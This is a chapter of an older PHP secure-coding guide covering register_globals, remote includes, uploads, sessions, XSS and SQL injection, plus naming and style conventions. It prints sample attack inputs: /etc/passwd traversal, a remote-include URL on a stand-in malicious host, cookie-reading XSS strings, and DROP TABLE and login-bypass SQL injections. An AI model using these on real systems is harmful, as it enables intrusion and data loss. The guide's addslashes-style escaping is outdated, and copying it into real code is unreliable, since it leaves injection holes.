<chapter label="11">

	<chapterinfo>
		<authorgroup>
			<author>
				<firstname>Mikael</firstname>
				<surname>Simonsson</surname>
				<email>mikael.simonsson@ver4.com</email>
			</author>
		</authorgroup>
	</chapterinfo>
	
	<title>PHP</title>

	<sect1>
	    <title>Introduction</title>
	    <para>
		PHP (recursive acronym for PHP: Hypertext Preprocessor) is a widely-used server-side 
		scripting language for creating dynamic web pages. Server-side means that the code is 
		interpreted on the server before the result is sent to the client. PHP code is embedded in 
		HTML code and it is really easy to get started with, while still very powerful for the 
		experienced programmer. However being extremely feature rich and easy to get started 
		with is not only positive, it to often leads to insecure applications vulnerable to several 
		different kinds of attacks. This chapter will try to explain the most common attacks and 
		how we can protect ourselves against them.
	    </para>
	    <para>
	    Note: PHP is open-source and freely downloadable from www.php.net.
	    </para>
	</sect1>

	<sect1>
	    <title>Global variables</title>
		<sect2>
			<title>register_globals</title>
			<para>
			The register_globals directive makes input from GET, POST and COOKIE, as well as 
			session variables and uploaded files, directly accessible as global variables in PHP. This 
			single directive, if set in php.ini, is the root of many vulnerabilities in web applications.
			</para>
			
			<para>
			Let's start by having a look at an example:
			</para>
			
			<programlisting>
			if ( $bIsAlwaysFalse ) 
			{
			    // This is never executed: 
			    $sFilename = 'somefile.php'; 
			}
			 
			...
			 
			if ( $sFilename != '' ) 
			{ 
			    // Open $sFilename and send it's contents to the browser
			    ... 
			}
			</programlisting>
			
			<para>
			If we were to call this page like: page.php?sFilename=/etc/passwd with register_globals 
			set, it would be the same as to write the following:
			</para>
			
			<programlisting>
			$sFilename = '/etc/passwd'; // This is done internally by PHP
			
			if ( $bIsAlwaysFalse ) 
			{
			    // This is never executed: 
			    $sFilename = 'somefile.php'; 
			} 
			
			...
			 
			if ( $sFilename != '' ) 
			{ 
			    // Open $sFilename and send it's contents to the browser
			    ... 
			}
			</programlisting>
			
			<para>
			PHP takes care of the $sFilename = '/etc/passwd'; part for us. What this means is that a 
			malicious user could inject his/her own value for $sFilename and view any file readable 
			under the current security context.
			</para>
			
			<para>
			We should always; I say that again, we should always think of that &quot;what if&quot; when 
			writing code. So turning off register_globals might be a solution but what if our code 
			ends up on a server with register_globals on. We must bear in mind that all variables in 
			global scope could have been tampered with. The correct way to write the above code 
			would be to make sure that we always assign a value to $sFilename:
			</para>
			
			
			<programlisting>
			// We initialize $sFilename to an empty string
			$sFilename = '';
			
			if ( $bIsAlwaysFalse ) 
			{
			    // This is never executed: 
			    $sFilename = 'somefile.php'; 
			} 
			
			...
			 
			if ( $sFilename != '' ) 
			{ 
			    // Open $sFilename and send it's contents to the browser
			    ... 
			}
			</programlisting>
			
			<para>
			Another solution would be to have as little code as possible in global scope. Object 
			oriented programming (OOP) is a real beauty when done right and I would highly 
			recommend you to take that approach. We could write almost all our code in classes 
			which is generally safer and promotes reuse.
			</para>
			
			
			<para>
			Like we never should assume that register_globals is off we should never assume it is on. 
			The correct way to get input from GET, POST, COOKIE etc is to use the superglobals 
			that were added in PHP version 4.1.0. These are the $_GET, $_POST, $_ENV, 
			$_SERVER, $_COOKIE, $_REQUEST $_FILES, and $_SESSION arrays. The term 
			superglobals is used since they are always available without regard to scope.
			</para>
		
		</sect2>
		
		<sect2>
			<title>Includes and Remote files</title>

			<para>
			The PHP functions include() and require() provides an easy way of including and 
			evaluating files. When a file is included, the code it contains inherits the variable scope of 
			the line on which the include statement was executed. All variables available at that line 
			will be available within the included file. And the other way around, variables defined in 
			the included file will be available to the calling page within the current scope.
			</para>
			
			<para>
			The included file does not have to be a file on the local computer. If the allow_url_fopen 
			directive is enabled in php.ini you can specify the file to be included using an URL. That 
			is PHP will get it via HTTP instead of a local pathname. While this is a nice feature it can 
			also be a big security risk. Note: The allow_url_fopen directive is enabled by default. 
			</para>
			
			<para>
			A common mistake is not considering that every file can be called directly, that is a file 
			written to be included is called directly by a malicious user. An example:
			</para>
			
			<programlisting>
			// file.php
			
			$sIncludePath = '/inc/';
			
			include($sIncludePath . 'functions.php');
			
			...
			
			// functions.php
			
			include($sIncludePath . 'datetime.php');
			include($sIncludePath . 'filesystem.php');
			</programlisting>
			
			<para>
			In the above example functions.php is not meant to be called directly, so it assumes 
			$sIncludePath is set by the calling page. By creating a file called datetime.php or 
			filesystem.php on another server (and turning off PHP processing on that server) we 
			could call functions.php like the following:
			</para>
			
			<programlisting>
			functions.php?sIncludePath=http://www.malicioushost.com/
			</programlisting>
			
			<para>
			PHP would nicely download datetime.php from the other server and execute it, which 
			means a malicious user could execute code of his/her choice in functions.php.
			</para>
			
			<para>
			I would recommend against includes within includes (as the example above). In my 
			opinion it makes it harder to understand and get an overview of the code. But right now 
			we want to make the above code safe and to do that we make sure that functions.php 
			really is called from file.php. The code below shows one solution:
			</para>
			
			<programlisting>
			// file.php
			
			define('SECURITY_CHECK', true);
			
			$sIncludePath = '/inc/';
			
			include($sIncludePath . 'functions.php');
			
			...
			
			// functions.php
			
			if ( !defined('SECURITY_CHECK') )
			{
			     // Output error message and exit.
			   ...
			}
			
			include($sIncludePath . 'datetime.php');
			include($sIncludePath . 'filesystem.php');
			</programlisting>
			
			<para>
			The function define() defines a constant. Constants are not prefixed by a dollar sign ($) 
			and thus we can not break this by something like: functions.php?SECURITY_CHECK=1
			</para>
			
			<para>
			Although not so common these days you can still come across PHP files with the .inc 
			extension. These files are only meant to be included by other files. What is often 
			overlooked is that these files, if called directly, does not go through the PHP preprocessor 
			and thus get sent in clear text. We should be consistent and stick with one extension that 
			we know gets processed by PHP. The .php extension is the recommended.
			</para>
			
		</sect2>
		
		<sect2>
			<title>File upload</title>
					
			<para>
			PHP is a feature rich language and one of it is built in features is automatic handling of 
			file uploads. When a file is uploaded to a PHP page it is automatically saved to a 
			temporary directory. New global variables describing the uploaded file will be available 
			within the page.
			</para>
			
			<para>
			Consider the following HTML code presenting a user with an upload form:
			</para>
			
			<programlisting>
			&lt;form action=&quot;page.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
			  &lt;input type=&quot;file&quot; name=&quot;testfile&quot; /&gt;
			  &lt;input type=&quot;submit&quot; value=&quot;Upload file&quot; /&gt;
			&lt;/form&gt;
			</programlisting>
			
			<para>
			After submitting the above form, new variables will be available to page.php based on the 
			&quot;testfile&quot; name.
			</para>
			
			<programlisting>
			// Variables set by PHP and what they will contain:
			
			// A temporary path/filename generated by PHP. This is where the file is saved until we 
			// move it or it is removed by PHP if we choose not to do anything with it.
			$testfile
			
			// The original name/path of the file on the client's system.
			$testfile_name
			
			// The size of the uploaded file in bytes.
			$testfile_size
			
			// The mime type of the file if the browser provided this information. For example: 
			&quot;image/jpeg&quot;.
			$testfile_type
			</programlisting>
			
			<para>
			A common approach is to check if $testfile is set and if it is, start working on it right 
			away, maybe copying it to a public directory, accessible from any browser. You probably 
			already guessed it; this is a very insecure way of working with uploaded files. The 
			$testfile variable does not have to be a path/file to an uploaded file. It could come from 
			GET, POST, and COOKIE etc. A malicious user could make us work on any file on the 
			server, which is not very pleasant.
			</para>
			
			<para>
			First of all, like I mentioned before we should not assume anything about the 
			register_globals directive, it could be on or off for all we care, our code should work with 
			or without it and most importantly it will be just as secure regardless of configuration 
			settings. So the first thing we should do is to use the $_FILES array:
			</para>
			
			<programlisting>
			// The temporary filename generated by PHP
			$_FILES['testfile']['tmp_name']
			
			// The original name/path of the file on the client's system.
			$_FILES['testfile']['name']
			
			// The mime type of the file if the browser provided this information. For example: 
			&quot;image/jpeg&quot;.
			$_FILES['testfile']['type']
			
			// The size of the uploaded file in bytes.
			$_FILES['testfile']['size']
			</programlisting>
			
			<para>
			The built in functions is_uploaded_file() and/or move_uploaded_file() should be called 
			with $_FILES['testfile']['tmp_name'] to make sure that the file really was uploaded by 
			HTTP POST. The following example shows a straightforward way of working with 
			uploaded files:
			</para>
			
			<programlisting>
			if ( is_uploaded_file($_FILES['testfile']['tmp_name']) ) 
			{
			
			    // Check if the file size is what we expect (optional)
			   if ( $_FILES['sImageData']['size'] &gt; 102400 )
			   {
			        // The size can not be over 100kB, output error message and exit.
			        ...       
			   }
			
			   // Validate the file name and extension based on the original name in 
			$_FILES['testfile']['name'],
			   // we do not want anyone to be able to upload .php files for example.
			   ...
			
			  // Everything is okay so far, move the file with move_uploaded_file
			  ...
			
			}
			</programlisting>
			
			
			<para>
			Note: We should always check if a variable in the superglobals arrays is set with isset() 
			before accessing it. I choose not to do that in the above examples because I wanted to 
			keep them as simple as possible.
			</para>
			
		</sect2>
		
		<sect2>
			<title>Sessions</title>

			<para>
			Sessions in PHP is a way of saving user specific variables or &quot;state&quot; across subsequent 
			page requests. This is achieved by handing a unique session id to the browser which the 
			browser submits with every new request. The session is alive as long as the browser 
			keeps sending the id with every new request and not to long time passes between 
			requests.
			</para>
			
			<para>
			The session id is generally implemented as a cookie but it could also be a value passed in 
			the URL. Session variables are saved to files in a directory specified in php.ini, the 
			filenames in this directory are based on the session ids. Each file will contain the 
			variables for that session in clear text.
			</para>
			
			<para>
			First we are going to look at the old and insecure way of working with sessions; 
			unfortunately this way of working with sessions is still widely used.
			</para>
			
			<programlisting>
			// first.php
			
			// Initalize session management
			session_start();
			
			// Authenticate user
			if ( ... )
			{
			   $bIsAuthenticated = true;
			}
			else
			{
			   $bIsAuthenticated = false;
			}
			
			// Register $bIsAuthenticated as a session variable
			session_register('bIsAuthenticated');
			
			echo '&lt;a href=&quot;second.php&quot;&gt;To second page&lt;/a&gt;';
			
			
			
			// second.php
			
			// Initalize session management
			session_start();
			
			// $bIsAuthenticated is automatically set by PHP
			if ( $bIsAuthenticated )
			{
			   // Display sensitive information
			  ...
			}
			</programlisting>
			
			<para>
			Why is this insecure? It is insecure because a simple second.php?bIsAuthenticated=1 
			would bypass the authentication in first.php.
			</para>
			
			<para>
			session_start() is called implicitly by session_register() or by PHP if the 
			session.auto_start directive is set in php.ini (defaults to off). However to be consistent 
			and not to rely on configuration settings we always call it for ourselves.
			</para>
			
			<para>
			The recommend way of working with sessions:
			</para>
			
			<programlisting>
			// first.php
			
			// Initalize session management
			session_start();
			
			// Authenticate user
			if ( ... )
			{
			   $_SESSION['bIsAuthenticated'] = true;
			}
			else
			{
			   $_SESSION['bIsAuthenticated'] = false;
			}
			
			echo '&lt;a href=&quot;second.php&quot;&gt;To second page&lt;/a&gt;';
			
			// second.php
			
			// Initalize session management
			session_start();
			
			if ($_SESSION['bIsAuthenticated'] )
			{
			   // Display sensitive information
			  ...
			}
			</programlisting>
			
			<para>
			Not only is the above code more secure it is also, in my opinion, much cleaner and easier 
			to understand.
			</para>
			
			<para>
			Note: On multi host system remember to secure the directory containing the session files, 
			otherwise users might be able to create custom session files for other sites.
			</para>

		</sect2>
		
	</sect1>
  
	<sect1>
	    <title>Cross site scripting (XSS)</title>
		<sect2>
			<title>XSS and PHP</title>

			<para>
			Consider a guestbook application written in PHP. The visitor is presented with a form 
			where he/she enters a message. This form is then posted to a page which saves the data to 
			a database.  When someone wishes to view the guestbook all messages are fetched from 
			the database to be sent to the browser.
			</para>
			
			<para>
			For each message in the database the following code is executed:
			</para>
			
			<programlisting>
			// $aRow contains one row from a SQL-query
			...
			echo '&lt;td&gt;';
			echo $aRow['sMessage'];
			echo '&lt;/td&gt;';
			...
			</programlisting>
			
			<para>
			What this means is that exactly what is entered in the form is later sent unchanged to 
			every visitor's browser. Why is this a problem? Picture someone entering the character &lt; 
			or &gt;, that would probably break the page's formatting. But we should be happy if that is 
			all that happens. This leaves the page wide open for injecting JavaScript, HTML, 
			VBScript, Flash, ActiveX etc. A malicious user could use this to present new forms, 
			fooling users to enter sensitive data. Unwanted advertising could be added to the site. 
			Cookies can be read with JavaScript on most browsers and thus most session id's, leading 
			to hijacked accounts.
			</para>
			
			<para>
			What we want to do here is to convert all characters that have special meaning to HTML 
			into HTML entities. Luckily PHP provides a function for doing just that, this function is 
			called htmlspecialchars and converts the characters &quot;, &amp;, &lt; and &gt; into &amp;amp;, &amp;quot;, 
			&amp;lt; and &amp;gt;. (PHP has another function called htmlentities which converts all characters 
			that have HTML entities equivalents, but htmlspecialchars suits our needs perfectly.)
			</para>
			
			<programlisting>
			// The correct way to do the above would be: 
			...
			echo '&lt;td&gt;';
			echo htmlspecialchars($aRow['sMessage']);
			echo '&lt;/td&gt;';
			...
			</programlisting>
			
			<para>
			One might wonder why we do not do this right away when saving the message to the 
			database. Well that is just begging for trouble, then we would have to keep track of where 
			the data in every variable comes from, and we would have to treat input from GET, 
			POST differently from data we fetch from a database. It is much better to be consistent 
			and call htmlspecialchars on the data right before we send it to the browser. This should 
			be done on all unfiltered input before sending it to the browser.
			</para>


		</sect2>
		
		<sect2>
			<title>Why htmlspecialchars is not always enough</title>
					
			<para>
			Let's take a look at the following code:
			</para>
			
			<programlisting>
			// This page is meant to be called like: page.php?sImage=filename.jpg
			echo '&lt;img src=&quot;' . htmlspecialchars($_GET['sImage']) . '&quot; /&gt;';
			</programlisting>
			
			<para>
			The above code without htmlspecialchars would leave us completely vulnerable to XSS 
			attacks but why is not htmlspecialchars enough? Since we are already in a HTML tag we 
			do not need &lt; or &gt; to be able to inject malicious code. Take a look at the following:
			</para>
			
			<programlisting>
			// We change the way we call the page:
			// page.php?sImage=javascript:alert(document.cookie);
			
			// Same code as before:
			echo '&lt;img src=&quot;' . htmlspecialchars($_GET['sImage']) . '&quot; /&gt;';
			
			&lt;!-- The above would result in: --&gt;
			&lt;img src=&quot;javascript:alert(document.cookie);&quot; /&gt;
			</programlisting>
			
			<para>
			&quot;javascript:alert(document.cookie);&quot; passes right through htmlspecialchars without a 
			change. Even if we replace some of the characters with HTML numeric character 
			references the code would still execute in some browsers.
			</para>
			
			<programlisting>
			&lt;!-- This would execute in some browsers: --&gt;
			&lt;img src=&quot;javascript&amp;#58;alert&amp;#40;document.cookie&amp;#41;;&quot; /&gt;
			</programlisting>
			
			<para>
			There is no generic solution here other than to only accept input we now is safe, trying to 
			filter out bad input is hard and we are bound to miss something. Our final code would 
			look like the following:
			</para>
			
			<programlisting>
			// We only accept input we know is safe (in this case a valid filename)
			if ( preg_match('/^[0-9a-z_]+\.[a-z]+$/i', $_GET['sImage']) )
			{
				echo '&lt;img src=&quot;' . $_GET['sImage'] . '&quot; /&gt;';
			}
			</programlisting>
		
		</sect2>
		
	</sect1>


	<sect1>
	    <title>SQL-injection</title>

		<para>
		The term SQL-injection is used to describe the injection of commands into an existing 
		SQL query. The Structured Query Language (SQL) is a textual language used to interact 
		with database servers like MySQL, MS SQL and Oracle.
		</para>
		
		<para>
		Why not start out with an example?
		</para>
		
		<programlisting>
		$iThreadId = $_POST['iThreadId'];
		
		// Build SQL query
		$sSql = &quot;SELECT sTitle FROM threads WHERE iThreadId = &quot; . $iThreadId;  
		
		To see what's wrong with to code above, let's take a look at the following HTML code:  
		
		&lt;form method=&quot;post&quot; action=&quot;insecure.php&quot;&gt;
		
		    &lt;input type=&quot;text&quot; name=&quot;iThreadId&quot; value=&quot;4; DROP TABLE users&quot; /&gt;
		
		    &lt;input type=&quot;submit&quot; value=&quot;Don't click here&quot; /&gt;
		
		&lt;/form&gt; 
		</programlisting>
		
		<para> 
		If we submit the above form to our insecure page, the string sent to the database server 
		would look like the following, which is not very pleasant: 
		</para> 
		
		<programlisting>
		SELECT sTitle FROM threads WHERE iThreadId = 4; DROP TABLE users  
		</programlisting>
		
		<para>
		There are several ways you can append SQL commands like this, some dependent of the 
		database server.
		</para>
		
		<para>
		To take this further, this code is common in PHP applications:
		</para>
		
		<programlisting>
		$sSql = &quot;SELECT iUserId FROM users&quot; .
		        &quot; WHERE sUsername = '&quot; . $_POST['sUsername'] . &quot;' AND sPassword = '&quot; . 
		$_GET['sPassword'] . &quot;'&quot;;  
		</programlisting>
		
		<para>
		We can easily skip the password section here by entering &quot;theusername'--&quot; as the 
		username or &quot;' OR '' = '&quot; as the password (without the double-quotes), resulting in:  
		</para>
		
		<programlisting>
		// Note: -- is a line comment in MS SQL so everything after it will be skipped
		SELECT iUserId FROM users WHERE sUsername = 'theusername'--' AND sPassword = 
		''
		// Or:
		SELECT iUserId FROM users WHERE sUsername = 'theusername' AND sPassword = '' 
		OR '' = ''  
		</programlisting>
		
		<para>
		Here is where validation comes into play, in the first example above we must check that 
		$iThreadId really is a number before we append it to the SQL-query.  
		</para>
		
		<programlisting>
		if ( !is_numeric($iThreadId) )
		{
		    // Not a number, output error message and exit.
		    ...
		}  
		</programlisting>
		
		<para>
		The second example is a bit trickier since PHP has built in functionality to prevent this, if 
		it is set. This directive is called magic_quotes_gpc, which like register_globals never 
		should have been built into PHP, in my opinion that is, and I will explain why.
		</para>
		
		<para>
		To have characters like ' in a string we have to escape them, this is done differently 
		depending on the database server: 
		</para>
		
		
		<programlisting>
		// MySQL:
		SELECT iUserId FROM users WHERE sUsername = 'theusername\'--' AND sPassword 
		= ''
		
		// MS SQL Server:
		SELECT iUserId FROM users WHERE sUsername = 'theusername''--' AND sPassword 
		= ''  
		</programlisting>
		
		<para>
		Now what magic_quotes_gpc does, if set, is to escape all input from GET, POST and 
		COOKIE (gpc). This is done as in the first example above, that is with a backslash. So if 
		you enter &quot;theusername'--&quot; into a form and submit it, $_POST['sUsername'] will contain 
		&quot;theusername\'--&quot;, which is perfectly safe to insert into the SQL-query, as long as the 
		database server supports it (MS SQL Server doesn't). This is the first problem the second 
		is that you need to strip the slashes if you're not using it to build a SQL-query.
		</para>
		
		<para>
		A general rule here is that we want our code to work regardless if magic_quotes_gpc is 
		set or not. The following code will show a solution to the second example:  
		</para>
		
		<programlisting>
		// Strip backslashes from GET, POST and COOKIE if magic_quotes_gpc is on
		if ( get_magic_quotes_gpc() )
		{
		    // GET
		    if ( is_array($_GET) )
		    {
		        // Loop through GET array
		        foreach( $_GET as $key =&gt; $value )
		        {
		            $_GET[$key] = stripslashes($value);
		        }
		    }
		
		    // POST
		    if ( is_array($_POST) )
		    {
		        // Loop through POST array
		        foreach( $_POST as $key =&gt; $value )
		        {
		            $_POST[$key] = stripslashes($value);
		        }
		    }
		
		    // COOKIE
		    if ( is_array($_COOKIE) )
		    {
		        // Loop through COOKIE array
		        foreach( $_COOKIE as $key =&gt; $value )
		        {
		            $_COOKIE[$key] = stripslashes($value);
		        }
		    }
		
		}
		
		function sqlEncode($sText)
		{
		    if ( $bIsMySql )
		        return addslashes($sText);
		    else // Is MS SQL Server
		        return str_replace(&quot;'&quot;, &quot;''&quot;, $sText);
		}
		
		$sUsername = $_POST['sUsername'];
		$sPassword = $_POST['sPassword'];
		
		$sSql = &quot;SELECT iUserId FROM users&quot; .
		        &quot; WHERE sUsername = '&quot; . sqlEncode($sUsername) . &quot;'&quot; . 
		        &quot; AND sPassword = '&quot; . sqlEncode($sPassword) . &quot;'&quot;;  
		</programlisting>
		
		<para>
		Preferably we put the if-statement and the sqlEncode function in an include.
		</para>
		
		
		<para>
		Now as you probably can imagine a malicious user can do a lot more than what I've 
		shown you here, that is if we leave our scripts vulnerable to injection. I have seen examples 
		of complete databases being extracted from vulnerabilities like the ones described above.
		</para>

	</sect1>


	<sect1>
	    <title>Target functions</title>
 
		<para>
		The following is a list of functions to be extra careful with. If unfiltered input get to one 
		of these functions exploitation is often possible.
		</para>

		<sect2>
		    <title>Execution of PHP code</title>
	 
			<para>
			include() and require() - Includes and evaluates a file as PHP code.
			eval() - Evaluates a string as PHP code.
			preg_replace() - The /e modifier makes this function treat the replacement parameter as 
			PHP code.
			</para>
	
		</sect2>

	</sect1>

	<sect1>
	    <title>Configuration settings</title>

		<sect2>
		    <title>register_globals</title>
	 
			<para>
			If you have the opportunity to turn off this directive you should definitely do so. 
			Unfortunately there is so much code out there that uses it so you are lucky if you can get 
			away with it.
			</para>
	
		</sect2>

	</sect1>


	<sect1>
	    <title>Recommended practices </title>

		<sect2>
		    <title>Double versus Single quotes</title>
	 
			<programlisting>
			// Double quotes:
			$sSql = &quot;SELECT iUserId FROM users WHERE sName = 'John Doe'&quot;;
			
			// Single quotes:
			echo '&lt;td width=&quot;100&quot;&gt;&lt;/td&gt;';  
			</programlisting>
			
			<para>
			As a general rule use double quotes with sql-commands, in all other cases use single 
			quotes.  
			</para>
	
		</sect2>

		<sect2>
		    <title>Do not rely on short_open_tag </title>
	 
			<para>
			If short_open_tag is set it allows the short form of PHP's open tag to be used, that is &lt;? 
			?&gt; instead of &lt;?php ?&gt;. Like register_globals you should never assume that this is set.  
			</para>
	
		</sect2>

		<sect2>
		    <title>String concatenation. </title>
	
			<programlisting>
			$sOutput = 'Hello ' . $sName;
			// Not: $sOutput = &quot;Hello $sName&quot;;  
			</programlisting>
			
			<para>
			This increases readability and is less error prone.
			</para>
	
		</sect2>

		<sect2>
		    <title>Comment your code.</title>
	
			<para>
			Always try to comment your code, regardless of how simple it may seem to you and 
			remember to use English.  
			</para>
	
		</sect2>
		
		<sect2>
		    <title>Complex code should always be avoided</title>

			<para>
			If you find that you have trouble understanding code you've written then try to picture 
			other people understanding it. Comments help but doesn't always do it here so rewrite!  
			</para>
	
		</sect2>

	</sect1>


	<sect1>
	    <title>Naming Conventions </title>

		<sect2>
		    <title>Variable names should be in mixed case starting with lower case prefix</title>
				 
			<programlisting>
			$sName, $iSizeOfBorder // string, integer
			</programlisting>
			 
			<para>
			This makes it very easy to look at a variable and directly see what it contains.
			</para>
			
			<para>
			Here is a list of common prefixes:
			a  Array  
			b  bool  
			d  double  
			f  float  
			i  int  
			l  long  
			s  string  
			g_  global (followed by normal prefix)
			</para> 
   
		</sect2>


		<sect2>
		    <title>Boolean variables should use the prefix b followed by is, has, can or should</title>
	 
			<programlisting>
			$bIsActive, $bHasOwner  
			</programlisting>
			
			<para>
			This also applies to functions that return boolean, but without the b prefix, for example:
			</para>
			
			<programlisting>
			$user-&gt;hasEmail();  
			</programlisting>
   
		</sect2>

		<sect2>
		    <title>Negated boolean variable names must be avoided</title>
	 
			<programlisting>
			var $bIsActive;
			// Not: $bIsNotActive
			
			var $bHasId;
			// Not: $bHasNoId  
			</programlisting>
			
			<para>
			It's not directly obvious what that following code does:
			</para>
			
			<programlisting>
			if ( !$bIsNotActive )
			{
			    ...
			}  
			</programlisting>
   
		</sect2>



		<sect2>
		    <title>Object variables should be all lowercase or use the prefix o or obj</title>
	 
			<programlisting>
			$session, $page // Preferred
			$oSession
			$objPage
			</programlisting>
			 
			<para>
			All lowercase is the preferred here but the important thing is to be consistent.  
			</para>
   
		</sect2>


		<sect2>
		    <title>Constants must be all uppercase using underscore to separate words</title>
	 
			<programlisting>
			$SESSION_TIMEOUT, $BACKGROUND_COLOR, $PATH  
			</programlisting>
			
			<para>
			However, in general the use of such constants should be minimized and if needed replace 
			them with functions.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>Function names should start with a verb and be written in mixed case starting with lower case</title>
	 
			<programlisting>
			validateUser(), fetchArray()  
			</programlisting>
   
		</sect2>
		
		
		<sect2>
		    <title>Abbreviations must not be uppercase when used in a name</title>
	 
			<programlisting>
			$sHtmlOutput
			// Not: $sHTMLOutput
			getPhpInfo()
			// Not: getPHPInfo()
			</programlisting>
			
			<para>
			Using all uppercase for the base name will give conflicts with the naming conventions 
			given above.  
			</para>
   
		</sect2>
		
		
		<sect2>
		    <title>SQL keywords should be all uppercase</title>
	 
			<programlisting>
			SELECT TOP 10 sUsername, sName FROM users  
			</programlisting>
			
			<para>
			This makes it much easier to understand and get an overview of a SQL query.  
			</para>
   
		</sect2>
		
		
		<sect2>
		    <title>Private class variables should have underscore suffix</title>
	 
			<programlisting>
			class MyClass
			{
			    var $sName_;
			}
			</programlisting>
			
			<para>
			This is a way of separating public and private variables. However this is not as important 
			as in other languages since in PHP you use the $this-&gt; pointer to access private variables. 
			</para> 
   
		</sect2>
		
		<sect2>
		    <title>All names should be written in English</title>
	 
			<programlisting>
			$iRowId // Not: $iRadId (Swedish) 
			</programlisting>
			
			<para>
			English is the preferred language for international development. This also applies to 
			comments.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>
		    Variables with a large scope should have long names, variables with 
			a small scope can have short names
			</title>
	 
			<para>
			Temporary variables are best kept short. Someone reading such variables should be able 
			to assume that its value is not used outside a few lines of code.
			</para>
			
			<para>
			Common temporary variables are $i, $j, $k, $m and $n. Since these variables should have 
			small scope prefixes are a bit of overkill.  
			</para>
   
		</sect2>

		<sect2>
		    <title>
		    The name of the object is implicit, and should be avoided in a method 
			name
			</title>
	 
			<programlisting>
			$session-&gt;getId() // Not: $session-&gt;getSessionId()
			</programlisting>
			
			<para>
			The latter might seem natural when writing the class declaration, but is implicit in use, as 
			shown in the example above.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>
		    The terms get/set must be used where an attribute is accessed 
			directly.
			</title>
	 
			<programlisting>
			$user-&gt;getName()
			$user-&gt;setName($sName)  
			</programlisting>
			
			<para>
			This is already common practice in languages like C++ and Java.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>Abbreviations should be avoided</title>
	 
			<programlisting>
			$session-&gt;initialize();
			// Not: $session-&gt;init();
			
			$thread-&gt;computePosts();
			// Not: $thread-&gt;compPosts();  
			</programlisting>
			
			<para>
			There is an exception to this rule and that is names that are better known for their shorter 
			form, like Html, Cpu etc.  
			</para>
   
		</sect2>
		
	</sect1>

	<sect1>
	    <title>Syntax</title>

		<sect2>
		    <title>Function and class declarations</title>
	 
			<programlisting>
			function doSomething()
			{
			    ...
			}
			
			// Not:
			function doSomething() {
			    ...
			}
			</programlisting>
			
			<para>
			The same applies to class declaration.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>Statements and curly brackets</title>
	 
			<programlisting>
			if ( $bIsActive )
			{
			    ...
			}
			
			// Not:
			if ( $bIsActive ) {
			    ...
			}
			</programlisting>
			
			<para>
			The first bracket should always be on the line after the statement, not on the same line. 
			The code is much easier to follow this way. This also applies to for, switch, while etc.  
			</para>
   
		</sect2>
		
		<sect2>
		    <title>Statements and spaces</title>
	 
			<programlisting>
			if ( $sName == 'John' )
			{
			    ...
			}
			
			// Not:
			if($sName=='John')
			{
			    ...
			} 
			</programlisting>
   
		</sect2>

	</sect1>

	<sect1>
	    <title>Summary</title>
  
		<para>
		If I were to summarize this chapter in one word it would be validate, I can not stress this 
		enough. Validate, validate and validate. Do not trust input from any source unless you 
		can be 100% certain that it has not been tampered with. This applies to variables in global 
		scope as well as input from GET, POST and COOKIE. Even data in a database can not 
		be trusted if it sometime came from user input.
		</para>
		
		<para>
		Never send unfiltered output to the browser or we would surely be vulnerable to XSS 
		attacks in one way or another. 
		</para>
  
	</sect1>

</chapter>